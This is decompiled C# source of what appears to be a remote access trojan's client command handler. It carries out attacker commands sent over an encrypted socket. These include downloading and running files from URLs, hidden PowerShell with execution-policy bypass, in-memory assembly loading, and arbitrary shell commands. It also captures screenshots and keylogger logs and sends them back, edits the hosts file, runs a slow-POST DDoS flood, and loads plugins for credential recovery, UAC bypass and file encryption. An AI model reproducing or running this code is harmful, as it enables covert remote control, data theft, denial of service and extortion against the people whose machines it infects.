using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

namespace Stub
{
	public class Messages
	{
		public static string[] Pack;

		public static int RS;

		public static Thread DDos;

		public static Thread ReportWindow;

		public static IntPtr Handle;

		public static void Read(byte[] b)
		{
			try
			{
				string[] array = Strings.Split(Helper.BS(Helper.AES_Decryptor(b)), Settings.SPL, -1, (CompareMethod)0);
				switch (array[0])
				{
				case "pong":
					ClientSocket.ActivatePong = false;
					ClientSocket.Send("pong" + Settings.SPL + Conversions.ToString(ClientSocket.Interval));
					ClientSocket.Interval = 0;
					break;
				case "rec":
					ProcessCritical.CriticalProcesses_Disable();
					Helper.CloseMutex();
					Application.Restart();
					Environment.Exit(0);
					break;
				case "CLOSE":
					ProcessCritical.CriticalProcesses_Disable();
					ClientSocket.S.Shutdown(SocketShutdown.Both);
					ClientSocket.S.Close();
					Environment.Exit(0);
					break;
				case "uninstall":
					Uninstaller.UNS(IsUpdate: false, null, null);
					break;
				case "update":
					Uninstaller.UNS(IsUpdate: true, array[1], Helper.Decompress(Convert.FromBase64String(array[2])));
					break;
				case "DW":
					RunDisk(array[1], Helper.Decompress(Convert.FromBase64String(array[2])));
					break;
				case "FM":
					Memory(Helper.Decompress(Convert.FromBase64String(array[1])));
					break;
				case "LN":
				{
					try
					{
						ServicePointManager.Expect100Continue = true;
						ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
						ServicePointManager.DefaultConnectionLimit = 9999;
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					string fileName = Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + array[1]);
					WebClient webClient = new WebClient();
					webClient.DownloadFile(array[2], fileName);
					Process.Start(fileName);
					break;
				}
				case "Urlopen":
					OpenUrl(array[1], Hidden: false);
					break;
				case "Urlhide":
					OpenUrl(array[1], Hidden: true);
					break;
				case "PCShutdown":
					Interaction.Shell("shutdown.exe /f /s /t 0", (AppWinStyle)0, false, -1);
					break;
				case "PCRestart":
					Interaction.Shell("shutdown.exe /f /r /t 0", (AppWinStyle)0, false, -1);
					break;
				case "PCLogoff":
					Interaction.Shell("shutdown.exe -L", (AppWinStyle)0, false, -1);
					break;
				case "RunShell":
					Interaction.Shell(array[1], (AppWinStyle)0, false, -1);
					break;
				case "StartDDos":
					try
					{
						DDos.Abort();
					}
					catch (Exception ex11)
					{
						ProjectData.SetProjectError(ex11);
						Exception ex12 = ex11;
						ProjectData.ClearProjectError();
					}
					DDos = new Thread(delegate(object a0)
					{
						TD(Conversions.ToString(a0));
					});
					DDos.Start(array[1]);
					break;
				case "StopDDos":
					try
					{
						DDos.Abort();
						break;
					}
					catch (Exception ex9)
					{
						ProjectData.SetProjectError(ex9);
						Exception ex10 = ex9;
						ProjectData.ClearProjectError();
						break;
					}
				case "StartReport":
					try
					{
						ReportWindow.Abort();
					}
					catch (Exception ex7)
					{
						ProjectData.SetProjectError(ex7);
						Exception ex8 = ex7;
						ProjectData.ClearProjectError();
					}
					ReportWindow = new Thread(delegate(object a0)
					{
						Monitoring(Conversions.ToString(a0));
					});
					ReportWindow.Start(array[1]);
					break;
				case "StopReport":
					try
					{
						ReportWindow.Abort();
						break;
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						ProjectData.ClearProjectError();
						break;
					}
				case "Xchat":
					ClientSocket.Send("Xchat" + Settings.SPL + Helper.ID());
					break;
				case "Hosts":
				{
					string text = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\drivers\\etc\\hosts";
					ClientSocket.Send("Hosts" + Settings.SPL + Helper.ID() + Settings.SPL + text + Settings.SPL + File.ReadAllText(text));
					break;
				}
				case "Shosts":
					try
					{
						File.WriteAllText(array[1], array[2]);
						ClientSocket.Send("HostsMSG" + Settings.SPL + Helper.ID() + Settings.SPL + "Modified successfully!");
						break;
					}
					catch (Exception ex3)
					{
						ProjectData.SetProjectError(ex3);
						Exception ex4 = ex3;
						ClientSocket.Send("HostsErr" + Settings.SPL + Helper.ID() + Settings.SPL + ex4.Message);
						ProjectData.ClearProjectError();
						break;
					}
				case "DDos":
					ClientSocket.Send("DDos");
					break;
				case "plugin":
					Pack = array;
					if (Helper.GetValue(array[1]) == null)
					{
						ClientSocket.Send("sendPlugin" + Settings.SPL + array[1]);
					}
					else
					{
						Plugin(Helper.Decompress(Helper.GetValue(array[1])));
					}
					break;
				case "savePlugin":
				{
					byte[] array2 = Convert.FromBase64String(array[2]);
					Helper.SetValue(array[1], array2);
					Plugin(Helper.Decompress(array2));
					break;
				}
				case "RemovePlugins":
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().DeleteSubKey(Helper.PL);
					SendMSG("Plugins Removed!");
					break;
				case "OfflineGet":
					ClientSocket.Send("OfflineGet" + Settings.SPL + Helper.ID() + Settings.SPL + File.ReadAllText(Settings.LoggerPath));
					break;
				case "$Cap":
					try
					{
						try
						{
							if (!Helper.ProcessDpi)
							{
								Helper.SetProcessDpiAwareness(2);
								Helper.ProcessDpi = true;
							}
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						Bitmap bitmap = new Bitmap(height: Screen.get_PrimaryScreen().get_Bounds().Height, width: Screen.get_PrimaryScreen().get_Bounds().Width, format: PixelFormat.Format16bppRgb555);
						Graphics graphics = Graphics.FromImage(bitmap);
						Size blockRegionSize = new Size(bitmap.Width, bitmap.Height);
						graphics.CopyFromScreen(0, 0, 0, 0, blockRegionSize, CopyPixelOperation.SourceCopy);
						MemoryStream memoryStream = new MemoryStream();
						Bitmap bitmap2 = new Bitmap(256, 156);
						Graphics graphics2 = Graphics.FromImage(bitmap2);
						Rectangle rectangle = new Rectangle(0, 0, 256, 156);
						Rectangle destRect = rectangle;
						Rectangle srcRect = new Rectangle(0, 0, bitmap.Width, bitmap.Height);
						graphics2.DrawImage(bitmap, destRect, srcRect, GraphicsUnit.Pixel);
						bitmap2.Save(memoryStream, ImageFormat.Jpeg);
						ClientSocket.Send("#CAP" + Settings.SPL + Helper.ID() + Settings.SPL + Convert.ToBase64String(Helper.Compress(memoryStream.ToArray())));
						try
						{
							graphics.Dispose();
							memoryStream.Dispose();
							bitmap2.Dispose();
							graphics2.Dispose();
							bitmap.Dispose();
							break;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
							break;
						}
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						ProjectData.ClearProjectError();
						break;
					}
				}
			}
			catch (Exception ex13)
			{
				ProjectData.SetProjectError(ex13);
				Exception ex14 = ex13;
				SendError(ex14.Message);
				ProjectData.ClearProjectError();
			}
		}

		public static void Plugin(byte[] B)
		{
			//Discarded unreachable code: IL_00cf, IL_0191, IL_0215, IL_029d, IL_0314
			try
			{
				Type[] types = AppDomain.CurrentDomain.Load(B).GetTypes();
				foreach (Type type in types)
				{
					if (Operators.CompareString(type.Name, "Plugin", false) != 0)
					{
						continue;
					}
					MethodInfo[] methods = type.GetMethods();
					foreach (object obj in methods)
					{
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"Run", false))
						{
							NewLateBinding.LateCall(obj, (Type)null, "Invoke", new object[2]
							{
								null,
								new object[5]
								{
									Settings.Host,
									Settings.Port,
									Settings.SPL,
									Settings.KEY,
									Helper.ID()
								}
							}, (string[])null, (Type[])null, (bool[])null, true);
							return;
						}
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"RunRecovery", false))
						{
							ClientSocket.Send(Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(string.Concat(string.Concat(string.Concat("Recovery" + Settings.SPL, Helper.ID()), Settings.SPL), Conversions.ToString(Convert.ToInt32(Pack[2]))), Settings.SPL), NewLateBinding.LateGet(obj, (Type)null, "Invoke", new object[2]
							{
								null,
								new object[1] { Convert.ToInt32(Pack[2]) }
							}, (string[])null, (Type[])null, (bool[])null))));
							return;
						}
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"RunOptions", false))
						{
							string text = Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "Invoke", new object[2]
							{
								null,
								new object[1] { Pack[2] }
							}, (string[])null, (Type[])null, (bool[])null));
							if (text.StartsWith("Error"))
							{
								SendError(text);
							}
							else
							{
								SendMSG(text);
							}
							return;
						}
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"injRun", false))
						{
							if (File.Exists(Pack[2]))
							{
								NewLateBinding.LateCall(obj, (Type)null, "Invoke", new object[2]
								{
									null,
									new object[2]
									{
										Pack[2],
										Helper.Decompress(Convert.FromBase64String(Pack[3]))
									}
								}, (string[])null, (Type[])null, (bool[])null, true);
							}
							return;
						}
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"UACFunc", false))
						{
							SendError(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "Invoke", new object[2]
							{
								null,
								new object[1] { Convert.ToInt32(Pack[2]) }
							}, (string[])null, (Type[])null, (bool[])null)));
							return;
						}
						if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"ENC", false))
						{
							if (Convert.ToBoolean(Pack[2]))
							{
								if (RS != 1)
								{
									RS = 1;
									SendMSG(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "Invoke", new object[2]
									{
										null,
										new object[5]
										{
											Helper.ID(),
											Helper.Decompress(Convert.FromBase64String(Pack[3])),
											Pack[4],
											Pack[5],
											Pack[6]
										}
									}, (string[])null, (Type[])null, (bool[])null)));
									RS = 2;
								}
								return;
							}
						}
						else if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(obj, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"DEC", false) && !Convert.ToBoolean(Pack[2]))
						{
							if (RS == 2)
							{
								RS = 1;
								SendMSG(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "Invoke", new object[2]
								{
									null,
									new object[1] { Helper.ID() }
								}, (string[])null, (Type[])null, (bool[])null)));
								RS = 0;
							}
							return;
						}
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				SendError("Plugin Error! " + ex2.Message);
				ProjectData.ClearProjectError();
			}
		}

		public static void SendMSG(string msg)
		{
			try
			{
				ClientSocket.Send("Msg" + Settings.SPL + msg);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		public static void SendError(string msg)
		{
			try
			{
				ClientSocket.Send("Error" + Settings.SPL + msg);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}

		public static void TD(string Input)
		{
			checked
			{
				try
				{
					string text = Input.Split(new char[1] { ':' })[0];
					string value = Input.Split(new char[1] { ':' })[1];
					int num = Convert.ToInt32(Input.Split(new char[1] { ':' })[2]) * 60;
					TimeSpan timeSpan = TimeSpan.FromSeconds(num);
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					while (timeSpan > stopwatch.Elapsed && ClientSocket.isConnected)
					{
						int num2 = 0;
						do
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								try
								{
									Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
									socket.Connect(text, Convert.ToInt32(value));
									string s = "POST / HTTP/1.1\r\nHost: " + text + "\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: " + Helper.userAgents[new Random().Next(Helper.userAgents.Length)] + "\r\nContent-length: 5235\r\n\r\n";
									byte[] bytes = Encoding.UTF8.GetBytes(s);
									socket.Send(bytes, 0, bytes.Length, SocketFlags.None);
									Thread.Sleep(2500);
									socket.Dispose();
								}
								catch (Exception ex3)
								{
									ProjectData.SetProjectError(ex3);
									Exception ex4 = ex3;
									ProjectData.ClearProjectError();
								}
							});
							thread.Start();
							num2++;
						}
						while (num2 <= 19);
						Thread.Sleep(5000);
					}
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
			}
		}

		public static void Monitoring(string Data)
		{
			List<string> list = new List<string>();
			string[] array = Strings.Split(Data, ",", -1, (CompareMethod)0);
			foreach (object obj in array)
			{
				list.Add(Conversions.ToString(NewLateBinding.LateGet(obj, (Type)null, "ToLower", new object[0], (string[])null, (Type[])null, (bool[])null)));
			}
			int num = 30;
			while (ClientSocket.isConnected)
			{
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (!string.IsNullOrEmpty(process.MainWindowTitle) && list.Any(process.MainWindowTitle.ToLower().Contains) && num > 30)
					{
						num = 0;
						SendMSG("Open [" + process.MainWindowTitle.ToLower() + "]");
					}
				}
				num = checked(num + 1);
				Thread.Sleep(1000);
			}
		}

		public static void OpenUrl(string Url, bool Hidden)
		{
			if (Hidden)
			{
				try
				{
					ServicePointManager.Expect100Continue = true;
					ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
					ServicePointManager.DefaultConnectionLimit = 9999;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Url);
				httpWebRequest.UserAgent = Helper.userAgents[new Random().Next(Helper.userAgents.Length)];
				httpWebRequest.AllowAutoRedirect = true;
				httpWebRequest.Timeout = 10000;
				httpWebRequest.Method = "GET";
				using ((HttpWebResponse)httpWebRequest.GetResponse())
				{
					return;
				}
			}
			Process.Start(Url);
		}

		[DllImport("avicap32.dll")]
		public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);

		[DllImport("avicap32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool capGetDriverDescriptionA(short wDriver, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszName, int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszVer, int cbVer);

		public static bool Cam()
		{
			checked
			{
				try
				{
					int num = 0;
					do
					{
						string lpszVer = null;
						short wDriver = (short)num;
						string lpszName = Strings.Space(100);
						if (capGetDriverDescriptionA(wDriver, ref lpszName, 100, ref lpszVer, 100))
						{
							return true;
						}
						num++;
					}
					while (num <= 4);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					ProjectData.ClearProjectError();
				}
				return false;
			}
		}

		private static void RunDisk(string Extension, byte[] Data)
		{
			object obj = Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + Extension);
			File.WriteAllBytes(Conversions.ToString(obj), Data);
			Thread.Sleep(500);
			if (Extension.ToLower().EndsWith(".ps1"))
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo("powershell.exe");
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				processStartInfo.Arguments = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"-ExecutionPolicy Bypass -File \"", obj), (object)"\""));
				Process process = Process.Start(processStartInfo);
				return;
			}
			Type typeFromHandle = typeof(Process);
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(obj) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall((object)null, typeFromHandle, "Start", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				obj = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}

		private static object Memory(byte[] buffer)
		{
			object result = default(object);
			try
			{
				Assembly assembly = AppDomain.CurrentDomain.Load(buffer);
				MethodInfo entryPoint = assembly.EntryPoint;
				object objectValue = RuntimeHelpers.GetObjectValue(assembly.CreateInstance(entryPoint.Name));
				object[] parameters = new object[1];
				if (entryPoint.GetParameters().Length == 0)
				{
					parameters = null;
				}
				entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), parameters);
				return result;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
